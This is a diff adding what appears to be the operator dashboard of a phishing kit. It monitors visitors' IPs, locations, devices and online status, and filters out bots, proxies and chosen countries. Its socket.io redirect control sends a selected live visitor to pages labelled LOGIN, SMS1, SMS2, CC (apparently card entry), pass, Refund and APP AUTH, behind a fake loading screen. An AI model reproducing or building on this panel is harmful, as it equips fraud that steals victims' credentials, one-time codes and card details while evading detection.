@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>IP Dashboard</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/6.7.0/css/flag-icons.min.css"
+      rel="stylesheet"
+    />
+    <style>
+      .table-hover tbody tr:hover {
+        background-color: rgba(0, 0, 0, 0.075);
+      }
+      .form-check-input:checked {
+        background-color: #198754;
+        border-color: #198754;
+      }
+      .stats-card {
+        transition: transform 0.2s;
+      }
+      .stats-card:hover {
+        transform: translateY(-5px);
+      }
+      .proxy-row {
+        background-color: rgba(13, 202, 240, 0.1) !important;
+      }
+      .bot-row {
+        background-color: rgba(255, 193, 7, 0.1) !important;
+      }
+      .new-entry {
+        animation: fadeIn 0.5s;
+      }
+      @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+      }
+    </style>
+  </head>
+  <body class="bg-light">
+    <div class="container-fluid py-4">
+      <div class="row mb-4">
+        <div class="col-12 col-md-6 col-lg-3 mb-3">
+          <div class="card stats-card bg-primary text-white h-100">
+            <div class="card-body">
+              <h5 class="card-title">Total Visitors</h5>
+              <h2 class="mb-0" id="totalVisitors">0</h2>
+            </div>
+          </div>
+        </div>
+        <div class="col-12 col-md-6 col-lg-3 mb-3">
+          <div class="card stats-card bg-warning text-dark h-100">
+            <div class="card-body">
+              <h5 class="card-title">Bots Detected</h5>
+              <h2 class="mb-0" id="botsDetected">0</h2>
+            </div>
+          </div>
+        </div>
+        <div class="col-12 col-md-6 col-lg-3 mb-3">
+          <div class="card stats-card bg-info text-white h-100">
+            <div class="card-body">
+              <h5 class="card-title">Proxy/VPN</h5>
+              <h2 class="mb-0" id="proxyVpn">0</h2>
+            </div>
+          </div>
+        </div>
+        <div class="col-12 col-md-6 col-lg-3 mb-3">
+          <div class="card stats-card bg-danger text-white h-100">
+            <div class="card-body">
+              <h5 class="card-title">Blocked IPs</h5>
+              <h2 class="mb-0" id="blockedIps">0</h2>
+            </div>
+          </div>
+        </div>
+      </div>
+<div>
+</div>
+      <!-- Redirect Section -->
+      <div class="card shadow-sm mb-4">
+        <div class="card-header bg-white d-flex justify-content-between align-items-center py-3">
+          <h5 class="mb-0">IP Redirect</h5>
+        </div>
+        <div class="card-body">
+          <div class="row mb-3">
+            <div class="col-md-6">
+              <div class="input-group mb-3">
+                <input type="text" class="form-control" id="redirectIpInput" placeholder="Enter IP address">
+                <select class="form-select" id="redirectUrlInput">
+                  <option selected disabled>Choose...</option>
+                  <option value="/loading?time=3&url=/">LOGIN</option>  
+                  <option value="/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ">SMS1</option>
+                  <option value="/loading?time=3&url=/LGknmeM9HwWUWSutj6mJ">SMS2</option>
+                  <option value="/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM">CC</option>
+                  <option value="/loading?time=3&url=/PPmP85AgNE4pnL5mWSM">pass</option>
+                  <option value="/loading?time=3&url=/PrTomeM9HwWUWSulkTe4">Refund</option>
+                  <option value="/loading?time=3&url=/Ose4aQeM9H4waRfs7PrTv">APP AUTH</option>
+                  <option value="/loading?time=3&url=/LkaaomeM9HwWU472fgsPr">SUCCESS</option>
+                 
+
+                  
+                </select>
+                <button class="btn btn-primary" id="redirectBtn">
+                  <i class="bi bi-arrow-right"></i> Redirect
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Country Blocking Section -->
+      <div class="card shadow-sm mb-4">
+        <div
+          class="card-header bg-white d-flex justify-content-between align-items-center py-3"
+        >
+          <h5 class="mb-0">Country Filtering</h5>
+          <div class="form-check form-switch">
+            <input
+              class="form-check-input"
+              type="checkbox"
+              id="countryModeToggle"
+            >
+            <label class="form-check-label" for="countryModeToggle">
+              <span id="countryModeLabel">Block Mode</span>
+            </label>
+          </div>
+        </div>
+        <div class="card-body">
+          <div class="row mb-3">
+            <div class="col-md-6">
+              <div class="input-group">
+                <input
+                  type="text"
+                  class="form-control"
+                  id="countryCodeInput"
+                  placeholder="Enter country code (e.g., US, FR)"
+                  maxlength="2"
+                />
+                <button class="btn btn-primary" id="blockCountryBtn">
+                  <span id="countryBtnText">Block Country</span>
+                </button>
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-12">
+              <h6><span id="countryListTitle">Blocked Countries</span></h6>
+              <div id="blockedCountriesList" class="d-flex flex-wrap gap-2">
+                <!-- Blocked countries will be displayed here -->
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card shadow-sm">
+        <div
+          class="card-header bg-white d-flex justify-content-between align-items-center py-3"
+        >
+          <h5 class="mb-0">IP Monitoring</h5>
+          <div class="form-check form-switch">
+            <input
+              class="form-check-input"
+              type="checkbox"
+              id="proxyDetectionToggle"
+              <% proxyDetectionEnabled?'checked':'' %>>
+              
+            <label class="form-check-label" for="proxyDetectionToggle"
+              >Proxy Detection</label
+            >
+          </div>
+        </div>
+        <div class="card-body">
+          <div class="table-responsive">
+            <table class="table table-hover align-middle">
+              <thead>
+                <tr>
+                  <th>IP Address</th>
+                  <th>FLAG</th>
+                  <th>Location</th>
+                  <th>ISP/Organization</th>
+                  <th>Browser/OS</th>
+                  <th>Requests</th>
+                  <th>Last Request</th>
+                  <th>Timezone</th>
+                  <th>Path Now</th>
+                  <th>Online</th>
+                  <th>Status</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+              <tbody id="ipTableBody"></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      const socket = io();
+      
+      // Handle redirect messages from server
+      socket.on('redirect', (data) => {
+        if (data.ip === currentIp) {
+          window.location.href = data.url;
+        }
+      });
+      
+      // Function to trigger redirect from dashboard
+      function triggerRedirect(ip, url) {
+        socket.emit('redirect-user', {ip: ip, url: url});
+      }
+      function getCurrentTimeInTimezone(timezone) {
+          try {
+              return new Date().toLocaleString('en-US', { timeZone: timezone });
+          } catch (e) {
+              return 'Unknown';
+          }
+      }
+
+      function updateDashboard() {
+          $.get('/dashboard/data', function(data) {
+              $('#totalVisitors').text(data.totalVisitors);
+              $('#botsDetected').text(data.botsDetected);
+              $('#proxyVpn').text(data.proxyVpn);
+              $('#blockedIps').text(data.blockedIps);
+
+              updateBlockedCountries(data.blockedCountries);
+              const tbody = $('#ipTableBody');
+              tbody.empty();
+
+              // Sort entries by last request time, newest first
+              const sortedEntries = Object.entries(data.ipCache).sort((a, b) => {
+                  const timeA = new Date(a[1].lastRequest || 0).getTime();
+                  const timeB = new Date(b[1].lastRequest || 0).getTime();
+                  return timeB - timeA;
+              });
+
+              sortedEntries.forEach(([ip, info]) => {
+                  const row = $('<tr>');
+                  // Add highlight class for new entries (less than 30 seconds old)
+                  const isNew = info.lastRequest && (Date.now() - new Date(info.lastRequest).getTime() < 30000);
+                  if (isNew) {
+                      row.addClass('new-entry');
+                  }
+                  // Add special styling for proxy and bot rows
+                  if (info.proxy || info.hosting) {
+                      row.addClass('proxy-row');
+                  }
+                  if (info.isBot) {
+                      row.addClass('bot-row');
+                  }
+                  row.append($('<td>').text(ip));
+                  const countryCode = info.countryCode ? info.countryCode.toUpperCase() : '';
+                console.log(countryCode);
+                  const flagHtml = countryCode ? `<img src="https://cdn.jsdelivr.net/gh/lipis/flag-icons/flags/4x3/${countryCode.toLowerCase()}.svg" width="40" alt="${countryCode}">` : '';
+                  row.append($('<td>').html(flagHtml));
+                  row.append($('<td>').html(`<div class="d-flex align-items-center"><span>${info.city || 'Unknown'}, ${info.country || 'Unknown'}</span></div>`));
+                  row.append($('<td>').text(info.isp || info.org || 'Unknown'));
+                  row.append($('<td>').text(`${info.browser || 'Unknown'} / ${info.os || 'Unknown'}`));
+                  row.append($('<td>').text(info.requestCount || 0));
+                  row.append($('<td>').text(info.lastRequest ? new Date(info.lastRequest).toLocaleString() : 'Never'));
+                  row.append($('<td>').text(info.timezone ? `${info.timezone} (${getCurrentTimeInTimezone(info.timezone)})` : 'Unknown'));
+                  row.append($('<td>').text(info.path || 'Unknown'));
+                  
+                  // Online status indicator
+                  const onlineStatus = info.isOnline ? 
+                    '<span class="badge bg-success"><i class="bi bi-circle-fill me-1"></i>Online</span>' : 
+                    '<span class="badge bg-secondary"><i class="bi bi-circle me-1"></i>Offline</span>';
+                  row.append($('<td>').html(onlineStatus));
+
+                  const statusBadges = [];
+                  if (info.isBot) statusBadges.push('<span class="badge bg-warning text-dark me-1">Bot</span>');
+                  if (info.proxy || info.hosting) statusBadges.push('<span class="badge bg-info me-1">Proxy/VPN</span>');
+                  if (info.isBlocked) statusBadges.push('<span class="badge bg-danger me-1">Blocked</span>');
+                  row.append($('<td>').html(statusBadges.join('') || '<span class="badge bg-success">Clean</span>'));
+
+                  const actionBtn = info.isBlocked ?
+                      `<button class="btn btn-sm btn-success unblock-btn" data-ip="${ip}"><i class="bi bi-unlock"></i> Unblock</button>` :
+                      `<button class="btn btn-sm btn-danger block-btn" data-ip="${ip}"><i class="bi bi-lock"></i> Block</button>`;
+                  row.append($('<td>').html(actionBtn));
+
+                  tbody.append(row);
+              });
+          });
+      }
+
+      let currentIp = '';
+
+function updateBlockedCountries(countries) {
+          const list = $('#blockedCountriesList');
+          list.empty();
+          
+          if (countries.length === 0) {
+              list.append(`<div class="text-muted">No countries ${countryAllowMode ? 'allowed' : 'blocked'} yet</div>`);
+              return;
+          }
+          
+          countries.forEach(country => {
+              const badgeClass = countryAllowMode ? 'bg-success' : 'bg-danger';
+              list.append(`
+                  <div class="badge ${badgeClass} d-flex align-items-center">
+                      ${country}
+                      <button class="btn btn-link text-white p-0 ms-2 unblock-country-btn" data-country="${country}">
+                          <i class="bi bi-x"></i>
+                      </button>
+                  </div>
+              `);
+          });
+      }
+
+      $(document).ready(function() {
+          // Get initial dashboard data
+          $.get('/dashboard/data', function(data) {
+              // Update proxy toggle based on server state if localStorage is empty
+              if (localStorage.getItem('proxyDetectionEnabled') === null) {
+                  $('#proxyDetectionToggle').prop('checked', data.proxyDetectionEnabled);
+                  localStorage.setItem('proxyDetectionEnabled', data.proxyDetectionEnabled);
+              }
+              
+              // Update country mode toggle based on server state if localStorage is empty
+              if (localStorage.getItem('countryAllowMode') === null) {
+                  const serverCountryMode = data.countryFilterMode === 'allow-only';
+                  $('#countryModeToggle').prop('checked', serverCountryMode);
+                  countryAllowMode = serverCountryMode;
+                  localStorage.setItem('countryAllowMode', serverCountryMode);
+                  updateCountryModeUI();
+              }
+              
+              // Update countries list
+              updateBlockedCountries(data.countries || (countryAllowMode ? data.allowedCountries : data.blockedCountries));
+          });
+          
+          updateDashboard();
+          setInterval(updateDashboard, 5000);
+
+          // Handle IP cell clicks
+          $(document).on('click', '#ipTableBody td:first-child', function() {
+              const ip = $(this).text();
+              $('#redirectIpInput').val(ip);
+          });
+          
+
+          // Initialize proxy detection toggle from localStorage
+          let proxyDetectionEnabled = localStorage.getItem('proxyDetectionEnabled') === 'true';
+          $('#proxyDetectionToggle').prop('checked', proxyDetectionEnabled);
+          
+          // Send initial state to server on page load
+          $.post('/dashboard/toggle-proxy-detection', { enabled: proxyDetectionEnabled }, function(data) {
+              if (data.success) {
+                  console.log('Proxy detection initialized:', data.proxyDetectionEnabled ? 'enabled' : 'disabled');
+                  updateDashboard();
+              }
+          });
+          
+          $('#proxyDetectionToggle').change(function() {
+              const enabled = $(this).is(':checked');
+              // Save to localStorage
+              localStorage.setItem('proxyDetectionEnabled', enabled);
+              
+              $.post('/dashboard/toggle-proxy-detection', { enabled: enabled }, function(data) {
+                  if (data.success) {
+                      console.log('Proxy detection toggled:', data.proxyDetectionEnabled ? 'enabled' : 'disabled');
+                      updateDashboard();
+                  }
+              });
+          });
+
+          // Country mode toggle (block vs allow-only)
+          let countryAllowMode = localStorage.getItem('countryAllowMode') === 'true';
+          
+          // Initialize toggle state from localStorage
+          $('#countryModeToggle').prop('checked', countryAllowMode);
+          updateCountryModeUI();
+          
+          // Send initial state to server on page load
+          $.post('/dashboard/toggle-country-mode', { allowMode: countryAllowMode }, function(data) {
+              if (data.success) {
+                  console.log('Country mode initialized:', countryAllowMode ? 'Allow Only' : 'Block');
+              }
+          });
+          
+          $('#countryModeToggle').change(function() {
+              countryAllowMode = $(this).is(':checked');
+              // Save to localStorage
+              localStorage.setItem('countryAllowMode', countryAllowMode);
+              updateCountryModeUI();
+              
+              // Send the mode change to server
+              $.post('/dashboard/toggle-country-mode', { allowMode: countryAllowMode }, function(data) {
+                  if (data.success) {
+                      console.log('Country mode toggled:', countryAllowMode ? 'Allow Only' : 'Block');
+                  }
+              });
+          });
+          
+          function updateCountryModeUI() {
+              if (countryAllowMode) {
+                  $('#countryModeLabel').text('Allow Only Mode');
+                  $('#countryBtnText').text('Allow Country');
+                  $('#countryListTitle').text('Allowed Countries');
+                  $('#countryModeToggle').addClass('bg-success');
+                  $('.badge[data-country]').removeClass('bg-danger').addClass('bg-success');
+              } else {
+                  $('#countryModeLabel').text('Block Mode');
+                  $('#countryBtnText').text('Block Country');
+                  $('#countryListTitle').text('Blocked Countries');
+                  $('#countryModeToggle').removeClass('bg-success');
+                  $('.badge[data-country]').removeClass('bg-success').addClass('bg-danger');
+              }
+          }
+          
+          $('#blockCountryBtn').click(function() {
+              const countryCode = $('#countryCodeInput').val().toUpperCase();
+              if (countryCode) {
+                  const endpoint = countryAllowMode ? '/dashboard/allow-country' : '/dashboard/block-country';
+                  $.post(endpoint, { countryCode }, function(data) {
+                      if (data.success) {
+                          updateBlockedCountries(data.countries);
+                          $('#countryCodeInput').val('');
+                          console.log(countryAllowMode ? 'Country allowed:' : 'Country blocked:', countryCode);
+                      }
+                  });
+              }
+          });
+
+          $(document).on('click', '.unblock-country-btn', function() {
+              const countryCode = $(this).data('country');
+              const endpoint = countryAllowMode ? '/dashboard/disallow-country' : '/dashboard/unblock-country';
+              $.post(endpoint, { countryCode }, function(data) {
+                  if (data.success) {
+                      updateBlockedCountries(data.countries);
+                      console.log(countryAllowMode ? 'Country disallowed:' : 'Country unblocked:', countryCode);
+                  }
+              });
+          });
+              
+
+
+          $(document).on('click', '.block-btn', function() {
+              const ip = $(this).data('ip');
+              $.post('/dashboard/block', { ip: ip }, function(data) {
+                  if (data.success) {
+                      updateDashboard();
+                  }
+              });
+          });
+
+          $(document).on('click', '.unblock-btn', function() {
+              const ip = $(this).data('ip');
+              $.post('/dashboard/unblock', { ip: ip }, function(data) {
+                  if (data.success) {
+                      updateDashboard();
+                  }
+              });
+          });
+
+          $('#redirectBtn').click(function() {
+              const ip = $('#redirectIpInput').val();
+              const url = $('#redirectUrlInput').val();
+              if (ip && url) {
+                  triggerRedirect(ip, url);
+                  $('#redirectIpInput').val('');
+                  $('#redirectUrlInput').val('');
+                  
+                  // Show success toast
+                  const toastEl = document.createElement('div');
+                  toastEl.innerHTML = `
+                    <div class="position-fixed bottom-0 end-0 p-3" style="z-index: 11">
+                      <div class="toast show" role="alert" aria-live="assertive" aria-atomic="true">
+                        <div class="toast-header bg-success text-white">
+                          <strong class="me-auto">Success</strong>
+                          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast" aria-label="Close"></button>
+                        </div>
+                        <div class="toast-body">
+                          Client ${ip} redirected to ${url}
+                        </div>
+                      </div>
+                    </div>
+                  `;
+                  document.body.appendChild(toastEl);
+                  
+                  // Auto remove toast after 3 seconds
+                  setTimeout(() => {
+                    toastEl.remove();
+                  }, 3000);
+              }
+          });
+        });
+    </script>
+  </body>
+</html>
